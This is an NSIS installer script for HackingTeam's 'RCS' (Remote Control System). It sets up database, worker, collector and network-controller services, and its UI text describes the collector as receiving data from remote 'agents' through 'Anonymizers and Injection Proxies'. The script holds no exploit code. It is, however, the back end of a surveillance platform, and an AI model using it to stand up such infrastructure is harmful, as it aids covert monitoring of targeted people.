;NSIS Modern User Interface

;--------------------------------
!include "MUI2.nsh"
  
!include nsDialogs.nsh
!include Sections.nsh
!include LogicLib.nsh
;--------------------------------
;General
  
  !define PACKAGE_NAME "RCS"
  !Define /file PACKAGE_VERSION "..\config\version.txt"

  ;Variables
  Var installALLINONE
  Var installDISTRIBUTED
  Var installUPGRADE
  
  Var installCollector
  Var installNetworkController
  Var installMaster
  Var installShard

  Var adminpass
  Var masterAddress
  Var localAddress
  Var masterCN
  Var masterLicense
  
  Var upgradeComponents
  
  ;Uninstaller variables
  Var deletefilesctrl
  Var deletefiles
  
  ;Name and file
  Name "RCS"
  OutFile "RCS-${PACKAGE_VERSION}.exe"

  ;Default installation folder
  InstallDir "C:\RCS\"

  ShowInstDetails "show"
  ShowUnInstDetails "show"
  
  !include "WordFunc.nsh"
  
;--------------------------------
;Install types
   InstType "install"
   InstType "update"

;--------------------------------

!macro _RunningX64 _a _b _t _f
  !insertmacro _LOGICLIB_TEMP
  System::Call kernel32::GetCurrentProcess()i.s
  System::Call kernel32::IsWow64Process(is,*i.s)
  Pop $_LOGICLIB_TEMP
  !insertmacro _!= $_LOGICLIB_TEMP 0 `${_t}` `${_f}`
!macroend

!define RunningX64 `"" RunningX64 ""`

;--------------------------------
;Interface Settings

  !define MUI_ABORTWARNING
  !define MUI_WELCOMEFINISHPAGE_BITMAP "HT.bmp"
  !define MUI_WELCOMEFINISHPAGE_BITMAP_NOSTRETCH
  !define MUI_ICON "RCS.ico"
  !define MUI_UNICON "RCS.ico"
  BrandingText "]HackingTeam[ ${PACKAGE_NAME} (${PACKAGE_VERSION})"

;--------------------------------
;Pages

  !insertmacro MUI_PAGE_WELCOME
  Page custom FuncUpgrade FuncUpgradeLeave
  Page custom FuncInstallationType FuncInstallationTypeLeave
  Page custom FuncSelectComponents FuncSelectComponentsLeave
  Page custom FuncCertificate FuncCertificateLeave
  Page custom FuncLicense FuncLicenseLeave
  Page custom FuncInsertCredentials FuncInsertCredentialsLeave
  Page custom FuncInsertAddress FuncInsertAddressLeave
  !insertmacro MUI_PAGE_INSTFILES

  ;Uninstaller pages
  !insertmacro MUI_UNPAGE_WELCOME
  UninstPage custom un.FuncDeleteFiles un.FuncDeleteFilesLeave
  !insertmacro MUI_UNPAGE_INSTFILES

;--------------------------------
;Languages

  !insertmacro MUI_LANGUAGE "English"

;--------------------------------
!macro _EnvSet
   ReadRegStr $R0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path"
   StrCpy $R0 "$R0;$INSTDIR\Collector\bin;$INSTDIR\DB\bin;$INSTDIR\Ruby\bin;$INSTDIR\Java\bin;$INSTDIR\Python"
   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path" "$R0"
   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("Path", "$R0").r0'

   SendMessage ${HWND_BROADCAST} ${WM_WININICHANGE} 0 "STR:Environment" /TIMEOUT=5000
!macroend
!define EnvSet "!insertmacro _EnvSet"

!macro _EnvUnset
   ReadRegStr $R0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path"

   StrCpy $R1 0
   StrLen $R2 "$INSTDIR\"
   ${Do}
      IntOp $R1 $R1 + 1
      ${WordFind} $R0 ";" "E+$R1" $R3
      IfErrors 0 +2
         ${Break}

      StrCmp $R3 $INSTDIR 0 +2
         ${Continue}

      StrCpy $R4 $R3 $R2
      StrCmp $R4 "$INSTDIR\" 0 +2
         ${Continue}

      StrCpy $R5 "$R5$R3;"
   ${Loop}

   ${If} $R3 == 1
      StrCpy $R5 $R0
   ${Else}
      StrCpy $R5 $R5 -1
   ${EndIf}

   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("Path", "$R5").r0'
   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path" "$R5"

   SendMessage ${HWND_BROADCAST} ${WM_WININICHANGE} 0 "STR:Environment" /TIMEOUT=5000
!macroend
!define EnvUnset "!insertmacro _EnvUnset"

!macro _EnvUnsetRCS7
   ReadRegStr $R0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path"

   StrCpy $R1 0
   ${Do}
      IntOp $R1 $R1 + 1
      ${WordFind} $R0 ";" "E+$R1" $R2
      IfErrors 0 +2
         ${Break}

      StrCmp $R2 "C:\RCSDB\java\bin" 0 +2
         ${Continue}

      StrCmp $R2 "C:\RCSDB\ruby\bin" 0 +2
         ${Continue}

      StrCpy $R3 "$R3$R2;"
   ${Loop}

   ${If} $R2 == 1
      StrCpy $R3 $R0
   ${Else}
      StrCpy $R3 $R3 -1
   ${EndIf}

   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path" "$R3"

   SendMessage ${HWND_BROADCAST} ${WM_WININICHANGE} 0 "STR:Environment" /TIMEOUT=5000
!macroend
!define EnvUnsetRCS7 "!insertmacro _EnvUnsetRCS7"

;--------------------------------
;Installer Sections

Section "Update Section" SecUpdate
   SectionIn 2

   DetailPrint ""
   DetailPrint "Stopping RCS Services..."
   SimpleSC::StopService "RCSCollector" 1
   Sleep 3000
   SimpleSC::StopService "RCSDB" 1
   Sleep 3000
   SimpleSC::StopService "RCSWorker" 1
   Sleep 3000
   SimpleSC::StopService "RCSMasterRouter" 1
   Sleep 3000
   SimpleSC::StopService "RCSMasterConfig" 1
   Sleep 3000
   SimpleSC::StopService "RCSShard" 1

   Sleep 5000
	 
   DetailPrint "done"
   
   SetDetailsPrint "textonly"
   DetailPrint "Removing previous version..."
   RMDir /r "$INSTDIR\Ruby"
   RMDir /r "$INSTDIR\Java"
   RMDir /r "$INSTDIR\Python"
   RMDir /r "$INSTDIR\DB\lib"
   RMDir /r "$INSTDIR\DB\bin"
   RMDir /r "$INSTDIR\DB\mongodb"
   RMDir /r "$INSTDIR\Collector\bin"
   RMDir /r "$INSTDIR\Collector\lib"
   DetailPrint "done"
  
SectionEnd

Section "Install Section" SecInstall
 
  SectionIn 1 2
 
  SetDetailsPrint "both"
  DetailPrint "Extracting common files..."
  SetDetailsPrint "textonly"
  !cd '..\..'
  SetOutPath "$INSTDIR\Ruby"
  File /r "Ruby\*.*"

  SetDetailsPrint "both"
  DetailPrint "done"

  SetOutPath "$INSTDIR\setup"
  File "DB\nsis\RCS.ico"

  DetailPrint "Setting up the path..."
  ${EnvUnsetRCS7}
  ${EnvUnset}
  ${EnvSet}
  DetailPrint "done" 

  ${If} $installMaster == ${BST_CHECKED}
  ${OrIf} $installShard == ${BST_CHECKED}
    DetailPrint "Installing Common files..."
    SetDetailsPrint "textonly"
    !cd 'DB'
 
    SetOutPath "$INSTDIR\Java"
    File /r "..\Java\*.*"
    SetOutPath "$INSTDIR\Python"
    File /r "..\Python\*.*"
  
    SetOutPath "$INSTDIR\DB\bin"
    File /r "bin\*.*"

    SetOutPath "$INSTDIR\DB\mongodb\win"
    File /r "mongodb\win\*.*"
    
    SetOutPath "$INSTDIR\DB\lib"
    File "lib\rcs-db.rb"
    File "lib\rcs-worker.rb"
    File /r "lib\rgloader"
 
    SetOutPath "$INSTDIR\DB\log"
    File /r "log\.keep"

    SetOutPath "$INSTDIR\DB\data"
    File /r "data\.keep"

    SetOutPath "$INSTDIR\DB\data\config"
    File /r "data\config\.keep"

    SetOutPath "$INSTDIR\DB\lib\rcs-db-release"
    File /r "lib\rcs-db-release\*.*"
    ###File /r "lib\rcs-db\*.*"
  
    SetOutPath "$INSTDIR\DB\lib\rcs-worker-release"
    File /r "lib\rcs-worker-release\*.*"
    ###File /r "lib\rcs-worker\*.*"

    SetOutPath "$INSTDIR\DB\config"
    File "config\mongoid.yaml"
    File "config\trace.yaml"
    File "config\export.zip"
    File "config\logo.png"
    File "config\version.txt"
    SetDetailsPrint "both"
    DetailPrint "done"

    !cd '..'  
  ${EndIf}
  
  ${If} $installMaster == ${BST_CHECKED}
    DetailPrint "Installing Master files..."
    SetDetailsPrint "textonly"
    !cd 'DB'
  
    SetOutPath "$INSTDIR\DB\console"
    File /r "console\*.*"

    SetOutPath "$INSTDIR\DB\config\certs"
    File "config\certs\openssl.cnf"

    SetDetailsPrint "both"
    DetailPrint "done"

    DetailPrint "Installing license.."
    CopyFiles /SILENT $masterLicense "$INSTDIR\DB\config\rcs.lic"

    DetailPrint "Installing drivers.."
    nsExec::ExecToLog "$INSTDIR\DB\bin\haspdinst -i -cm -kp -fi"
    SimpleSC::SetServiceFailure "hasplms" "0" "" "" "1" "60000" "1" "60000" "1" "60000"

    ; check if the license + dongle is ok
    StrCpy $0 5000
    ${Do}
      nsExec::Exec "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-license"
      Pop $0
      ${If} $0 != 0
         MessageBox MB_OK|MB_ICONEXCLAMATION "Insert the USB token associated with the license and press OK"
         StrCpy $0 15000
      ${EndIf}
    ${LoopUntil} $0 == 0

    ; fresh install
    ${If} $installUPGRADE != ${BST_CHECKED}
      DetailPrint ""
      DetailPrint "Writing the configuration..."
      SetDetailsPrint "textonly"
      ; write the config yaml
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config --defaults --CN $masterCN"
      ; generate the SSL cert
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config --generate -G"
      ; generate the keystores
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config --generate-keystores"
      SetDetailsPrint "both"
      DetailPrint "done"

      DetailPrint "Creating service RCS Master Config..."
      nsExec::Exec '$INSTDIR\DB\mongodb\win\mongod.exe --dbpath $INSTDIR\DB\data\config --nssize 64 --logpath $INSTDIR\DB\log\mongoc.log --logappend --configsvr --rest --install --serviceName RCSMasterConfig --serviceDisplayName "RCS Master Config" --serviceDescription "Remote Control System Master Configuration"'
      SimpleSC::SetServiceFailure "RCSMasterConfig" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      DetailPrint "done"      
      
      DetailPrint "Creating service RCS Master Router..."
      nsExec::Exec "$INSTDIR\DB\bin\nssm.exe install RCSMasterRouter $INSTDIR\DB\mongodb\win\mongos.exe --logpath $INSTDIR\DB\log\mongos.log --logappend --configdb $masterCN"
      SimpleSC::SetServiceFailure "RCSMasterRouter" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSMasterRouter" "DisplayName" "RCS Master Router"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSMasterRouter" "Description" "Remote Control System Master Router for shards"
      DetailPrint "done"   
      
      DetailPrint "Creating service RCS Shard..."
      nsExec::Exec '$INSTDIR\DB\mongodb\win\mongod.exe --dbpath $INSTDIR\DB\data --journal --nssize 64 --logpath $INSTDIR\DB\log\mongod.log --logappend --shardsvr --rest --install --serviceName RCSShard --serviceDisplayName "RCS Shard" --serviceDescription "Remote Control System DB Shard for data storage"'
      SimpleSC::SetServiceFailure "RCSShard" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      DetailPrint "done"

      DetailPrint "Creating service RCS DB..."
      nsExec::Exec  "$INSTDIR\DB\bin\nssm.exe install RCSDB $INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db"
      SimpleSC::SetServiceFailure "RCSDB" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSDB" "DisplayName" "RCS DB"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSDB" "Description" "Remote Control System Application Layer"
      DetailPrint "done"

      DetailPrint "Creating service RCS Worker..."
      nsExec::Exec  "$INSTDIR\DB\bin\nssm.exe install RCSWorker $INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-worker"
      SimpleSC::SetServiceFailure "RCSWorker" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSWorker" "DisplayName" "RCS Worker"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSWorker" "Description" "Remote Control System Worker for data decoding"
      DetailPrint "done"
    ${EndIf}
    
    SetDetailsPrint "both"

    Delete $INSTDIR\DB\data\config\mongod.lock
    DetailPrint "Starting RCS Master Config..."
    SimpleSC::StartService "RCSMasterConfig" "" 30
    Sleep 5000

    Delete $INSTDIR\DB\data\mongod.lock
    DetailPrint "Starting RCS Shard..."
    SimpleSC::StartService "RCSShard" "" 30
    Sleep 5000

    DetailPrint "Starting RCS Master Router..."
    SimpleSC::StartService "RCSMasterRouter" "" 30
    Sleep 5000

    DetailPrint "Starting RCS DB..."
    SimpleSC::StartService "RCSDB" "" 30
    Sleep 10000

    DetailPrint "Starting RCS Worker..."
    SimpleSC::StartService "RCSWorker" "" 30
    Sleep 5000

    ${If} $installUPGRADE != ${BST_CHECKED}
    	DetailPrint "Setting the Admin password..."
    	nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config --reset-admin $adminpass"
    ${EndIf}
      
    DetailPrint "Adding firewall rule for port 443/tcp and 444/tcp..."
    nsExec::ExecToLog 'netsh advfirewall firewall add rule name="RCSDB" dir=in action=allow protocol=TCP localport=443'
    nsExec::ExecToLog 'netsh advfirewall firewall add rule name="RCSDB" dir=in action=allow protocol=TCP localport=444'

    !cd '..'
    WriteRegDWORD HKLM "Software\HT\RCS" "installed" 0x00000001
    WriteRegDWORD HKLM "Software\HT\RCS" "master" 0x00000001
  ${EndIf}

  ${If} $installShard == ${BST_CHECKED}
    DetailPrint "Installing single Shard files..."
    SetDetailsPrint "textonly"
    !cd 'DB'
       
    SetDetailsPrint "both"
    DetailPrint "done"
    
    ; fresh install
    ${If} $installUPGRADE != ${BST_CHECKED}
      DetailPrint "Creating service RCS Shard..."
      nsExec::Exec '$INSTDIR\DB\mongodb\win\mongod.exe --dbpath $INSTDIR\DB\data --journal --nssize 64 --logpath $INSTDIR\DB\log\mongod.log --logappend --shardsvr --rest --install --serviceName RCSShard --serviceDisplayName "RCS Shard" --serviceDescription "Remote Control System DB Shard for data storage"'
      SimpleSC::SetServiceFailure "RCSShard" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      DetailPrint "done"
      
      DetailPrint "Creating service RCS Worker..."
      nsExec::Exec  "$INSTDIR\DB\bin\nssm.exe install RCSWorker $INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-worker"
      SimpleSC::SetServiceFailure "RCSWorker" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSWorker" "DisplayName" "RCS Worker"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSWorker" "Description" "Remote Control System Worker for data decoding"
      DetailPrint "done"
      
      DetailPrint "Starting RCS Shard..."
      SimpleSC::StartService "RCSShard" "" 30
      Sleep 3000
      DetailPrint "Starting RCS Worker..."
      SimpleSC::StartService "RCSWorker" "" 30
    
      DetailPrint "Writing the configuration..."
      SetDetailsPrint "textonly"
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config --defaults --CN $masterAddress"
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\DB\bin\rcs-db-config -u admin -p $adminpass -d $masterAddress --add-shard $localAddress"
      SetDetailsPrint "both"
      DetailPrint "done"
    ${EndIf}
    
    DetailPrint "Starting RCS Shard..."
    SimpleSC::StartService "RCSShard" "" 30
    Sleep 3000
    DetailPrint "Starting RCS Worker..."
    SimpleSC::StartService "RCSWorker" "" 30

    !cd '..'
    WriteRegDWORD HKLM "Software\HT\RCS" "installed" 0x00000001
    WriteRegDWORD HKLM "Software\HT\RCS" "shard" 0x00000001
  ${EndIf}

  ${If} $installCollector == ${BST_CHECKED}
  ${OrIf} $installNetworkController == ${BST_CHECKED}
    DetailPrint "Installing Collector files..."
    SetDetailsPrint "textonly"
    !cd 'Collector'
  
    SetOutPath "$INSTDIR\Collector\bin"
    File /r "bin\*.*"
    
    SetOutPath "$INSTDIR\Collector\lib"
    File "lib\rcs-collector.rb"
    
    SetOutPath "$INSTDIR\Collector\lib\rcs-collector-release"
    File /r "lib\rcs-collector-release\*.*"
  
    SetOutPath "$INSTDIR\Collector\config"
    File "config\decoy.html"
    File "config\trace.yaml"
    File "config\version.txt"
    SetDetailsPrint "both"
    DetailPrint "done"
    
    DetailPrint "Adding firewall rule for port 80/tcp..."
    nsExec::ExecToLog 'netsh advfirewall firewall add rule name="RCSCollector" dir=in action=allow protocol=TCP localport=80'

    !cd '..'
    WriteRegDWORD HKLM "Software\HT\RCS" "installed" 0x00000001
    
    ; fresh install
    ${If} $installUPGRADE != ${BST_CHECKED}
      DetailPrint ""
      DetailPrint "Writing the configuration..."
      SetDetailsPrint "textonly"
      ; retrieve the certs from the server
      nsExec::Exec  "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\Collector\bin\rcs-collector-config --defaults -d $masterAddress -u admin -p $adminpass -t -s"
      SetDetailsPrint "both"
      DetailPrint "done"
    
      DetailPrint "Creating service RCS Collector..."
      nsExec::Exec  "$INSTDIR\DB\bin\nssm.exe install RCSCollector $INSTDIR\Ruby\bin\ruby.exe $INSTDIR\Collector\bin\rcs-collector"
      SimpleSC::SetServiceFailure "RCSCollector" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSCollector" "DisplayName" "RCS Collector"
      WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSCollector" "Description" "Remote Control System Collector for data reception"
      DetailPrint "done"
    ${EndIf}

    ${If} $installCollector == ${BST_CHECKED}     
      WriteRegDWORD HKLM "Software\HT\RCS" "collector" 0x00000001
    ${Else}
      nsExec::Exec "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\Collector\bin\rcs-collector-config --no-collector"
    ${EndIf}
    
    ${If} $installNetworkController == ${BST_CHECKED}
      WriteRegDWORD HKLM "Software\HT\RCS" "networkcontroller" 0x00000001
    ${Else}
      nsExec::Exec "$INSTDIR\Ruby\bin\ruby.exe $INSTDIR\Collector\bin\rcs-collector-config --no-network"
    ${EndIf}

    DetailPrint "Starting RCS Collector..."
    SimpleSC::StartService "RCSCollector" ""
          
  ${EndIf}

  ; we insert the core here, because we need the server up and running
  ; when che collector is installed. loading the cores take much time...
  ${If} $installMaster == ${BST_CHECKED}
    !cd 'DB'
    DetailPrint "Installing Cores files..."
    SetDetailsPrint "textonly"

    SetOutPath "$INSTDIR\DB\cores"
    File /r "cores\*.*"

    SetDetailsPrint "both"
    DetailPrint "done"

    DetailPrint "ReStarting RCS DB..."
    SimpleSC::RestartService "RCSDB" "" 30
    !cd '..'
  ${EndIf}

  !cd "DB\nsis"
  
  DetailPrint "Writing uninstall informations..."
  SetDetailsPrint "textonly"
  WriteUninstaller "$INSTDIR\setup\RCS-uninstall.exe"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "DisplayName" "RCS"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "DisplayIcon" "$INSTDIR\setup\RCS.ico"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "DisplayVersion" "${PACKAGE_VERSION}"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "UninstallString" "$INSTDIR\setup\RCS-uninstall.exe"
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "NoModify" 0x00000001
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "NoRepair" 0x00000001
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "InstDir" "$INSTDIR"

  SetDetailsPrint "both"
 
SectionEnd

Section Uninstall
  DetailPrint "Stopping RCS Services..."
  SimpleSC::StopService "RCSCollector" 1
  SimpleSC::StopService "RCSWorker" 1
  SimpleSC::StopService "RCSDB" 1
  SimpleSC::StopService "RCSMasterRouter" 1
  SimpleSC::StopService "RCSMasterConfig" 1
  SimpleSC::StopService "RCSShard" 1
  DetailPrint "done"

  DetailPrint "Removing RCS Services..."
  SimpleSC::RemoveService "RCSCollector"
  SimpleSC::RemoveService "RCSWorker"
  SimpleSC::RemoveService "RCSDB"
  SimpleSC::RemoveService "RCSMasterRouter"
  SimpleSC::RemoveService "RCSMasterConfig"
  SimpleSC::RemoveService "RCSShard"
  DetailPrint "done"

  DetailPrint ""
  DetailPrint "Deleting files..."
  SetDetailsPrint "textonly"
  ReadRegStr $INSTDIR HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS" "InstDir"
  RMDir /r "$INSTDIR\Ruby"
  RMDir /r "$INSTDIR\Java"
  RMDir /r "$INSTDIR\Python"
  
  ${If} $deletefiles == ${BST_CHECKED}
    RMDir /r "$INSTDIR\DB"
    RMDir /r "$INSTDIR\Collector"
    RMDir /r "$INSTDIR"
  ${EndIf}
  
  SetDetailsPrint "both"
  DetailPrint "done"

  DetailPrint ""
  DetailPrint "Removing registry keys..."
  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\RCS"
  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Run\RCS"
  DeleteRegKey HKLM "Software\HT\RCS\installed"
  DeleteRegKey HKLM "Software\HT\RCS\master"
  DeleteRegKey HKLM "Software\HT\RCS\collector"
  DeleteRegKey HKLM "Software\HT\RCS\networkcontroller"
  DeleteRegKey HKLM "Software\HT\RCS\shard"
  DeleteRegKey HKLM "Software\HT\RCS"
  DeleteRegKey HKLM "Software\HT"
  DetailPrint "done"

  ${EnvUnset}

SectionEnd

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Function .onInit

	${IfNot} ${RunningX64}
		MessageBox MB_OK "RCS can be installed only on 64 bit systems"
    Quit
  ${EndIf}

FunctionEnd

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Function FuncUpgrade

  ReadRegDWORD $R0 HKLM "Software\HT\RCS" "installed"
  
  ; RCS is not installed
  IntCmp $R0 1 +2 0 0
    Abort

  ; check which components we have
  ReadRegDWORD $R0 HKLM "Software\HT\RCS" "collector"
  IntCmp $R0 1 0 +4 +4
    StrCpy $upgradeComponents "$upgradeComponentsCollector$\r"
    Push ${BST_CHECKED}
    Pop $installCollector 

  ReadRegDWORD $R0 HKLM "Software\HT\RCS" "networkcontroller"
  IntCmp $R0 1 0 +4 +4
    StrCpy $upgradeComponents "$upgradeComponentsNetwork Controller$\r"
    Push ${BST_CHECKED}
    Pop $installNetworkController 
    
  ReadRegDWORD $R0 HKLM "Software\HT\RCS" "master"
  IntCmp $R0 1 0 +4 +4
    StrCpy $upgradeComponents "$upgradeComponentsMaster$\r"
    Push ${BST_CHECKED}
    Pop $installMaster 
    
  ReadRegDWORD $R0 HKLM "Software\HT\RCS" "shard"
  IntCmp $R0 1 0 +4 +4
    StrCpy $upgradeComponents "$upgradeComponentsShard$\r"
    Push ${BST_CHECKED}
    Pop $installShard 

  !insertmacro MUI_HEADER_TEXT "Installation Type" "Upgrade"

  nsDialogs::Create /NOUNLOAD 1018
  
  CreateFont $R1 "Arial" "8" "600"
  
  ${NSD_CreateLabel} 0 5u 100% 20u "The setup has detected that at least one RCS component is installed on this machine."
  ${NSD_CreateLabel} 0 25u 100% 20u  "If you continue the following components will be upgraded:"
  ${NSD_CreateLabel} 20u 40u 100% 50u  $upgradeComponents
  Pop $1
  SendMessage $1 ${WM_SETFONT} $R1 0
  
  ${NSD_CreateCheckBox} 20u 100u 200u 12u "YES, Upgrade."
  Pop $1
  SendMessage $1 ${WM_SETFONT} $R1 0
 
  nsDialogs::Show
FunctionEnd

Function FuncUpgradeLeave
  ${NSD_GetState} $1 $installUPGRADE

  ${If} $installUPGRADE != ${BST_CHECKED}
    MessageBox MB_OK|MB_ICONSTOP "Please check the upgrade option. If you don't want to upgrade exit the installer now."
    Abort
  ${EndIf}
  
  SetCurInstType 1
  
FunctionEnd


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncInstallationType
   ${If} $installUPGRADE == ${BST_CHECKED}
    Abort
   ${EndIf}
   
  !insertmacro MUI_HEADER_TEXT "Installation Type" "Deployment Method"

  nsDialogs::Create /NOUNLOAD 1018
  
  CreateFont $R1 "Arial" "8" "600"
  
  ${NSD_CreateLabel} 0 5u 100% 10u "Please select the installation type you want:"
  ${NSD_CreateRadioButton} 20u 20u 200u 12u "All-in-one"
  Pop $1
  SendMessage $1 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 35u 250u 25u "All the compoments will be installed on a single machine. Easy setup for small deployments."
  
  ${NSD_CreateRadioButton} 20u 60u 200u 12u "Distributed"
  Pop $2
  SendMessage $2 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 75u 250u 25u "The installation is fully customizable. Each component can be installed on different machine to achieve maximum scalability. Suggested for big deployments."

  ${NSD_Check} $1

  nsDialogs::Show
FunctionEnd

Function FuncInstallationTypeLeave
  ${NSD_GetState} $1 $installALLINONE
  ${NSD_GetState} $2 $installDISTRIBUTED
  
  ; Automatically select all the components
  ${If} $installALLINONE == ${BST_CHECKED}
    Push ${BST_CHECKED}
    Pop $installCollector 
    Push ${BST_CHECKED}
    Pop $installNetworkController 
    Push ${BST_CHECKED}
    Pop $installMaster 
  ${EndIf}
FunctionEnd


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncSelectComponents
   ${If} $installUPGRADE == ${BST_CHECKED}
   ${OrIf} $installALLINONE == ${BST_CHECKED}
    Abort
   ${EndIf}

  !insertmacro MUI_HEADER_TEXT "Installation Type" "Components selection"
  
  CreateFont $R1 "Arial" "8" "600"
  
  nsDialogs::Create /NOUNLOAD 1018
  
  ${NSD_CreateLabel} 0 0u 100% 10u "Backend:"
  Pop $0
  SendMessage $0 ${WM_SETFONT} $R1 0
  ${NSD_CreateCheckBox} 20u 10u 200u 12u "Master Node"
  Pop $3
  SendMessage $3 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 23u 300u 15u "The Application Server and the primary node for the Database."

  ${NSD_CreateCheckBox} 20u 35u 200u 12u "Shard"
  Pop $4
  SendMessage $4 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 48u 280u 25u "Distributed single shard of the Database. It needs at least one Master node to be connected to."


  ${NSD_CreateLabel} 0 70u 100% 10u "Frontend:"
  Pop $0
  SendMessage $0 ${WM_SETFONT} $R1 0
  ${NSD_CreateCheckBox} 20u 80u 200u 12u "Collector"
  Pop $1
  SendMessage $1 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 93u 300u 25u "Service responsible for the data collection from the agents. It has to be exposed on the internet with a public IP address."

  ${NSD_CreateCheckBox} 20u 115u 200u 12u "Network Controller"
  Pop $2
  SendMessage $2 ${WM_SETFONT} $R1 0
  ${NSD_CreateLabel} 30u 128u 300u 15u "Service responsible for the communications with Anonymizers and Injection Proxies."

  
  nsDialogs::Show
FunctionEnd

Function FuncSelectComponentsLeave
  ${NSD_GetState} $1 $installCollector
  ${NSD_GetState} $2 $installNetworkController
  ${NSD_GetState} $3 $installMaster
  ${NSD_GetState} $4 $installShard
  
  ${If} $installMaster == ${BST_CHECKED}
  ${AndIf} $installShard == ${BST_CHECKED}
    MessageBox MB_OK|MB_ICONSTOP "The Master Node already include the first Shard, please deselect it."
    Abort
  ${EndIf}
  
FunctionEnd



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncCertificate
   ${If} $installUPGRADE == ${BST_CHECKED}
    Abort
   ${EndIf}
   ${If} $installMaster != ${BST_CHECKED} 
   ${AndIf} $installDISTRIBUTED == ${BST_CHECKED}
     Abort
   ${EndIf}
   
   !insertmacro MUI_HEADER_TEXT "Configuration settings: Certificate" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "Certificate Common Name (hostname or IP address):"
   ${NSD_CreateLabel} 5u 22u 20u 10u "CN:"
   ${NSD_CreateText} 30u 20u 200u 12u ""
   Pop $1

   ${NSD_SetFocus} $1
   nsDialogs::Show
FunctionEnd

Function FuncCertificateLeave
  ${NSD_GetText} $1 $masterCN

  StrCmp $masterCN "" 0 +3
    MessageBox MB_OK|MB_ICONSTOP "Certificate CN cannot be empty"
    Abort
    
  ${StrFilter} $masterCN "12" "-." "" $0
  StrCmp $0 $masterCN +3 0
    MessageBox MB_OK|MB_ICONSTOP "Certificate CN can only contain alphanumeric characters, hyphens and dots"
    Abort
    
FunctionEnd



